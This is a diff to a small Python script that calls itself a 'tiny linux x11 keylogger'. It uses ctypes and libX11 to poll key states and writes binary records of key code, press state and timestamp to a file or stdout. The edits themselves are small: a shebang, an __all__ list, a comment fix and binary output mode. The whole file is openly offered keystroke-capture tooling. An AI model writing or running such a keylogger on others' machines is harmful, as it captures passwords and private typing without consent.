@@ -1,3 +1,4 @@
+#!/usr/bin/env python
 import sys
 from time import sleep
 import ctypes as ct
@@ -7,10 +8,11 @@ from struct import pack
 
 assert("linux" in sys.platform)
 
+__all__ = ('struct_format', 'fetch_keys', 'log', '__main__')
 
 x11 = ct.cdll.LoadLibrary(find_library("X11"))
 
-# unsigned char key, bool pressed, int timestamp (microsec)
+# unsigned char key, bool pressed, unsigned long timestamp (microsec)
 struct_format = 'B?L'
 
 
@@ -39,6 +41,7 @@ def log(output_file, sleep_interval=0.005):
         output_file.write(pack(struct_format, key, pressed, int(time()*1000)))
         output_file.flush()
 
+
 def argparser():
     import argparse
     argp = argparse.ArgumentParser(description='peylogger - tiny linux x11 keylogger')
@@ -46,13 +49,15 @@ def argparser():
                      ,help      = 'Output file - default is STDOUT'
                      ,metavar   = 'FILE'
                      ,default   = sys.stdout
-                     ,type      = argparse.FileType('w')
+                     ,type      = argparse.FileType('wb')
                      )
     return vars(argp.parse_args())
+
 
 def __main__():
     args = argparser()
     log(args['output'])
+
 
 if __name__ == "__main__":
     __main__()
